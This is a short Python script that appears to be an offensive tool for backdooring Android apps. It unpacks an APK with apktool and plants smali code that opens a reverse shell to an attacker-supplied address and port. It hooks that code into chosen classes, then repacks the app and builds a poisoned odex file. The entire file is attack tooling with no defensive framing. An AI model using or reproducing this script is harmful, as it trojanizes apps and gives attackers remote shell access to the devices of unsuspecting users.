import sys
import tempfile

from poison_helper import *

apk = sys.argv[1]
rev_shell_address = sys.argv[2]
rev_shell_port = int(sys.argv[3])
target_classes = sys.argv[4].split(';')
unpacked_dir = tempfile.mkdtemp('odexpoison', 'kek')
dist = unpacked_dir + '/dist/'
print(unpacked_dir)


# -------------------


def run():
    adb_push_dexoptwrapper()
    apktool_d(apk, unpacked_dir)
    classes_dirs = apktool_dir_get_classes_dirs(unpacked_dir)
    hi_classes = classes_dirs.pop()
    hi_classes_path = unpacked_dir + '/' + hi_classes
    plant_smalish(rev_shell_address, rev_shell_port, hi_classes_path)
    plant_smalish_calls(hi_classes_path, target_classes)
    apktool_b(unpacked_dir)
    packed_apk_name = os.listdir(dist)[0]
    unzip_dst = packed_apk_name.replace('.apk', '')
    subprocess.check_output(['unzip', '-d', unzip_dst, packed_apk_name], cwd=dist)
    dexfilename = get_dex_filename_from_smali_classes_dirname(hi_classes)
    dexopt(dist + '/' + unzip_dst + '/' + dexfilename,
           dist + '/' + unzip_dst + '/' + dexfilename.replace('dex', 'odex'))


run()
